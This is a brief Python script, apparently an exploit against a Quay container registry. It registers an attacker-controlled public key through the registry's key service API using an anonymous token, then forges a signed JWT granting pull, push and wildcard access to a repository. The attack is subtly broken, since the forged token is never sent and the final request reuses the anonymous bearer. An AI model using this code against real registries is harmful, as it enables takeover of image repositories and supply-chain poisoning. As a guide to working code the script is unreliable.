import time
import requests
import jwt


def replace_registry_trust(registry, public_jwk, private_key, key_id, repository):
    response = requests.get(registry + "/v2/auth", params={"service": registry})
    bearer = response.json()["token"]
    requests.put(registry + "/keys/services/quay/keys/" + key_id,
                 json=public_jwk, headers={"Authorization": "Bearer " + bearer})
    now = int(time.time())
    claims = {"iss": "quay", "aud": registry, "sub": "anonymous",
              "iat": now, "nbf": now, "exp": now + 300,
              "access": [{"type": "repository", "name": repository,
                          "actions": ["pull", "push", "*"]}]}
    forged = jwt.encode(claims, private_key, algorithm="RS256", headers={"kid": key_id})
    return requests.get(registry + "/v2/" + repository + "/manifests/latest",
                        headers={"Authorization": "Bearer " + bearer})
